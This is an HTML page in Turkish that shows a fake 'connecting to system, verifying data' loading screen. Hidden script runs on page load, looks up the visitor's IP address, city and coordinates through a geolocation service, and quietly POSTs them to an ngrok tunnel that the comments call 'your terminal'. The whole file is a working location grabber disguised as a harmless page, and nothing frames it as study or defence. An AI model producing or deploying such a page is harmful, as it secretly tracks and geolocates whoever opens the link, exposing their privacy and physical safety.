<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Yükleniyor...</title>
    <style>
        body {
            background-color: #000;
            color: #0f0;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .loader {
            text-align: center;
        }
        .dots:after {
            content: ' .';
            animation: dots 1s steps(5, end) infinite;
        }
        @keyframes dots {
            0%, 20% { content: ' .'; }
            40% { content: ' ..'; }
            60% { content: ' ...'; }
            80%, 100% { content: ''; }
        }
    </style>
</head>
<body>

    <div class="loader">
        <h1>SİSTEME BAĞLANILIYOR<span class="dots"></span></h1>
        <p>Lütfen bekleyiniz, veriler doğrulanıyor...</p>
    </div>

<script>
    async function veriyiToplaVeGonder() {
        try {
            // 1. IP Bilgilerini çek
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();

            // 2. Veriyi senin terminaline gönder (JSON formatında)
            await fetch("https://punctual-villain-arson.ngrok-free.dev/log", {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    ip: data.ip,
                    city: data.city,
                    loc: data.latitude + "," + data.longitude
                })
            });
            console.log("Veri paketlendi ve fırlatıldı!");
        } catch (err) {
            console.error("Bir hata çıktı ama terminale boş gitmesin diye durduruldu.");
        }
    }

    // Fonksiyonu çalıştır
    veriyiToplaVeGonder();
</script>
</body>
</html>
